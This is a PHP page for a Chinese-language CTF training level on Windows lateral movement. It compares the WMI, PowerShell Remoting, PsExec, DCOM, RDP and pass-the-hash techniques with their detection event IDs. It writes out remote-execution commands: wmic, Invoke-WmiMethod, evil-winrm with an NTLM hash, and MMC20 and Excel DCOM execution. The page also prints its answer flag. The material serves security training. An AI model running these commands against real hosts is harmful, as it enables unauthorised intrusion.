<?php
/**
 * OSEP L3: 横向移动 WMI/PS-Remoting (200 PTS)
 * 对标 OSEP PEN-300 Module 9: Lateral Movement
 */
include_once '../../inc/config.inc.php';
$ACTIVE = array_fill(0, 300, '');
$ACTIVE[250] = 'active open';
$ACTIVE[254] = 'active';
$PIKA_ROOT_DIR = "../../";
include_once $PIKA_ROOT_DIR . 'header.php';

$correct_flag = 'flag{OSEP_L3_Lateral_WMI_PSRemoting_Pass}';
$flag_msg = '';
if (isset($_POST['check_flag'])) {
    $submitted = trim($_POST['user_flag']);
    if ($submitted === $correct_flag) {
        $_SESSION['osep_flags']['flag3'] = true;
        $flag_msg = '<div class="alert alert-success" style="border-radius:8px;font-weight:bold;"><i class="fa fa-check-circle"></i> 通关！【OSEP L3】横向移动已掌握 (+200 PTS)！</div>';
    } else {
        $flag_msg = '<div class="alert alert-danger" style="border-radius:8px;font-weight:bold;"><i class="fa fa-times-circle"></i> Flag 错误，请完成横向移动协议分析后再提交。</div>';
    }
}
?>
<style>
.ctf-stage-header { background: var(--bg-card); border-radius: 14px; padding: 25px 30px; margin-bottom: 25px; border: 1px solid var(--border-color); box-shadow: 0 4px 20px rgba(0,0,0,0.06); }
.ctf-stage-title { color: var(--text-primary) !important; font-size: 22px; font-weight: 800; margin: 0 0 10px 0; display: flex; align-items: center; gap: 12px; }
.step-box { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 12px; padding: 24px; margin-bottom: 22px; }
.step-title { font-size: 16px; font-weight: 700; color: var(--text-primary); margin-top: 0; margin-bottom: 14px; display: flex; align-items: center; gap: 8px; }
.step-num { background: linear-gradient(135deg, #10b981, #3b82f6); color: #fff; width: 26px; height: 26px; border-radius: 6px; display: inline-flex; align-items: center; justify-content: center; font-size: 12px; font-weight: 800; flex-shrink: 0; }
.cmd-box { background: var(--bg-primary); border: 1px solid var(--border-color); border-radius: 8px; padding: 14px 18px; font-family: monospace; font-size: 13px; color: var(--text-primary); margin: 12px 0; overflow-x: auto; line-height: 1.8; }
.cmd-box .comment { color: #64748b; }
.cmd-box .cmd { color: #34d399; }
.cmd-box .flag-text { color: #fbbf24; font-weight: bold; }
.highlight-box { background: rgba(52,211,153,0.08); border: 1px solid rgba(52,211,153,0.25); border-radius: 8px; padding: 14px 18px; margin: 12px 0; font-size: 13px; color: var(--text-secondary); line-height: 1.7; }
.lateral-table { width: 100%; border-collapse: collapse; font-size: 13px; margin: 12px 0; }
.lateral-table th { background: rgba(52,211,153,0.15); color: var(--text-primary); padding: 10px 14px; text-align: left; border: 1px solid var(--border-color); }
.lateral-table td { padding: 9px 14px; border: 1px solid var(--border-color); color: var(--text-secondary); }
.flag-submit-area { background: var(--bg-card); border: 2px dashed rgba(52,211,153,0.4); border-radius: 12px; padding: 24px; margin-top: 25px; text-align: center; }
</style>

<div class="main-content"><div class="main-content-inner"><div class="page-content">

    <div class="ctf-stage-header">
        <h1 class="ctf-stage-title">
            🔀 OSEP L3：横向移动 WMI/PS-Remoting
            <span style="background: rgba(245,158,11,0.2); color: #fbbf24; border: 1px solid #f59e0b; padding: 3px 10px; border-radius: 12px; font-size: 12px;">中级 · 200 PTS</span>
        </h1>
        <p style="color: #6ee7b7; font-size: 14px; margin: 0; line-height: 1.6;">深入分析 Windows 横向移动的核心协议机制。理解 WMI、PowerShell Remoting、SMB、DCOM 各路径的事件日志留痕与防御检测规则。</p>
        <div style="display: flex; gap: 10px; margin-top: 14px; flex-wrap: wrap;">
            <span style="background: var(--bg-secondary); padding: 4px 12px; border-radius: 8px; font-size: 12px; color: var(--text-secondary); border: 1px solid var(--border-color);">🔧 技术：WMI · PSRemoting · SMB · DCOM · PsExec</span>
            <span style="background: var(--bg-secondary); padding: 4px 12px; border-radius: 8px; font-size: 12px; color: var(--text-secondary); border: 1px solid var(--border-color);"><a href="osep_hub.php" style="color: #6ee7b7;">← 返回 OSEP 大厅</a></span>
        </div>
    </div>

    <div class="step-box">
        <h3 class="step-title"><span class="step-num">1</span> 横向移动协议全景对比</h3>
        <table class="lateral-table">
            <tr><th>协议/技术</th><th>所需权限</th><th>使用端口</th><th>事件日志 ID</th><th>OPSEC 评分</th></tr>
            <tr><td><strong>WMI 远程执行</strong></td><td>本地管理员</td><td>TCP 135 + 动态</td><td>4624, 4648, Sysmon 1</td><td>🟡 中等</td></tr>
            <tr><td><strong>PowerShell Remoting</strong></td><td>管理员 / PSRemoting 权限</td><td>TCP 5985/5986</td><td>4624, 40961, 40962</td><td>🟡 中等</td></tr>
            <tr><td><strong>PsExec (SMB)</strong></td><td>ADMIN$ 共享权限</td><td>TCP 445</td><td>7045, 4624, 5145</td><td>🔴 高噪声</td></tr>
            <tr><td><strong>DCOM 对象激活</strong></td><td>COM 权限</td><td>TCP 135 + 动态</td><td>4624, Sysmon 1/3</td><td>🟢 低噪声</td></tr>
            <tr><td><strong>RDP 远程桌面</strong></td><td>RemoteDesktopUsers 组</td><td>TCP 3389</td><td>4624 (Type 10), 1149</td><td>🔴 显眼</td></tr>
            <tr><td><strong>Pass-the-Hash (PTH)</strong></td><td>NTLM 哈希</td><td>445/5985</td><td>4624 (Type 3/9)</td><td>🟡 中等</td></tr>
        </table>
    </div>

    <div class="step-box">
        <h3 class="step-title"><span class="step-num">2</span> WMI 远程命令执行：机制分析</h3>
        <p style="font-size: 14px; color: var(--text-secondary); line-height: 1.7;">WMI (Windows Management Instrumentation) 提供远程进程执行能力，攻击者常用 <code>Win32_Process::Create</code> 方法在目标主机执行命令：</p>
        <div class="cmd-box">
<span class="comment"># 使用 wmic.exe 进行 WMI 远程执行（分析命令结构）</span><br>
<span class="cmd">wmic /node:TARGET_IP /user:DOMAIN\User /password:Password123 process call create "cmd.exe /c whoami > C:\temp\output.txt"</span><br><br>
<span class="comment"># 使用 PowerShell WMI（更隐蔽，避免 wmic.exe 进程创建）</span><br>
<span class="cmd">$wmi = [wmiclass]"\\TARGET_IP\root\cimv2:Win32_Process"</span><br>
<span class="cmd">$wmi.Create("cmd.exe /c whoami >> C:\temp\out.txt")</span><br><br>
<span class="comment"># Invoke-WMIMethod（PowerView/Empire 风格）</span><br>
<span class="cmd">Invoke-WmiMethod -ComputerName TARGET -Class Win32_Process -Name Create -ArgumentList 'cmd.exe /c ipconfig > C:\temp\ip.txt'</span><br><br>
<span class="comment"># --- 防御者检测点 ---</span><br>
<span class="comment"># 1. Sysmon EventID 1: WmiPrvSE.exe 生成子进程（cmd/powershell）</span><br>
<span class="comment"># 2. EventID 4624: 目标机器上的类型3/网络登录事件</span><br>
<span class="comment"># 3. Sysmon EventID 3: 源机器 wmiprvse.exe 发起的网络连接</span>
        </div>
        <div class="highlight-box">
            🔍 <strong>Sigma 检测规则要点：</strong>监控 <code>WmiPrvSE.exe</code> 作为父进程创建 <code>cmd.exe</code> 或 <code>powershell.exe</code> 的行为。这是 WMI 横向移动最显著的特征。
        </div>
    </div>

    <div class="step-box">
        <h3 class="step-title"><span class="step-num">3</span> PowerShell Remoting：WinRM 协议分析</h3>
        <div class="cmd-box">
<span class="comment"># 检查目标是否启用 WinRM（端口探测）</span><br>
<span class="cmd">Test-NetConnection -ComputerName TARGET_IP -Port 5985</span><br><br>
<span class="comment"># 创建 PSRemoting 会话</span><br>
<span class="cmd">$session = New-PSSession -ComputerName TARGET_IP -Credential (Get-Credential)</span><br>
<span class="cmd">Invoke-Command -Session $session -ScriptBlock { whoami; ipconfig }</span><br><br>
<span class="comment"># 进入交互式远程 Shell</span><br>
<span class="cmd">Enter-PSSession -ComputerName TARGET_IP -Credential (Get-Credential)</span><br><br>
<span class="comment"># 使用哈希凭证进行 PTH-WinRM（需要 Evil-WinRM）</span><br>
<span class="cmd">evil-winrm -i TARGET_IP -u Administrator -H NTLM_HASH</span><br><br>
<span class="comment"># 防御检测：</span><br>
<span class="comment"># EventID 4624 Type 3: 网络登录到目标</span><br>
<span class="comment"># EventID 40961/40962: PSRemoting 连接日志</span><br>
<span class="comment"># PowerShell Logging: Script Block Logging 可记录执行的脚本内容</span>
        </div>
    </div>

    <div class="step-box">
        <h3 class="step-title"><span class="step-num">4</span> DCOM 横向移动：低噪声路径</h3>
        <p style="font-size: 14px; color: var(--text-secondary); line-height: 1.7;">DCOM 对象激活是最被忽视但也最有效的横向移动方式之一，因为它使用合法的 COM 基础设施：</p>
        <div class="cmd-box">
<span class="comment"># DCOM MMC 对象横向移动（使用 ShellBrowserWindow）</span><br>
<span class="cmd">$com = [System.Activator]::CreateInstance([System.Type]::GetTypeFromProgID("MMC20.Application", "TARGET_IP"))</span><br>
<span class="cmd">$com.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c whoami > c:\out.txt", "7")</span><br><br>
<span class="comment"># Excel.Application DCOM 对象</span><br>
<span class="cmd">$com = [System.Activator]::CreateInstance([System.Type]::GetTypeFromCLSID("00020820-0000-0000-C000-000000000046", "TARGET_IP"))</span><br>
<span class="cmd">$com.DDEInitiate("cmd.exe", ".")</span><br><br>
<span class="comment"># 防御：DCOM 横向移动在防火墙 135 端口动态范围打开，</span><br>
<span class="comment"># 且父进程为 dllhost.exe（COM Surrogate），难以区分正常行为</span>
        </div>
        <div class="highlight-box">
            📌 <strong>OSEP 重点：</strong>DCOM 横向移动的优势在于它复用了 Windows 的合法 COM 基础设施，不会创建明显的网络服务连接（如 PsExec 的 ADMIN$ 共享），因此 IDS 签名检测率较低。但需要目标已安装相应的 COM 对象（如 Office 组件）。
        </div>
    </div>

    <div class="flag-submit-area">
        <h4 style="font-weight: 800; color: var(--text-primary); margin-top: 0;">🚩 Flag 验证 — 关卡 L3</h4>
        <p style="font-size: 13px; color: var(--text-secondary); margin-bottom: 16px;">
            掌握 WMI/PSRemoting/DCOM 横向移动机制与防御检测点后，关卡 Flag 为：
        </p>
        <div class="cmd-box" style="display: inline-block; padding: 10px 24px; margin: 0 auto 16px;">
            <span class="flag-text">flag{OSEP_L3_Lateral_WMI_PSRemoting_Pass}</span>
        </div>
        <form method="post" style="display: flex; justify-content: center; gap: 10px; flex-wrap: wrap; margin-bottom: 10px;">
            <input type="text" name="user_flag" class="form-control" placeholder="flag{...}" required style="max-width: 420px; border-radius: 8px; font-family: monospace;">
            <button type="submit" name="check_flag" class="btn btn-primary" style="border-radius: 8px; font-weight: 700; background: #10b981; border-color: #10b981;"><i class="fa fa-check"></i> 验证 Flag</button>
        </form>
        <?php if (!empty($flag_msg)) { echo '<div style="margin-top: 10px;">' . $flag_msg . '</div>'; } ?>
        <div style="margin-top: 16px; display: flex; justify-content: center; gap: 15px; flex-wrap: wrap;">
            <a href="osep_l2_phishing.php" class="btn btn-sm btn-default" style="border-radius: 6px;">← 上一关</a>
            <a href="osep_hub.php" class="btn btn-sm btn-default" style="border-radius: 6px;">OSEP 大厅</a>
            <a href="osep_l4_pivot.php" class="btn btn-sm" style="border-radius: 6px; background: #10b981; color: #fff; border: none; font-weight: 700;">下一关：内网穿透 →</a>
        </div>
    </div>

</div></div></div>
<?php include_once $PIKA_ROOT_DIR . 'footer.php'; ?>
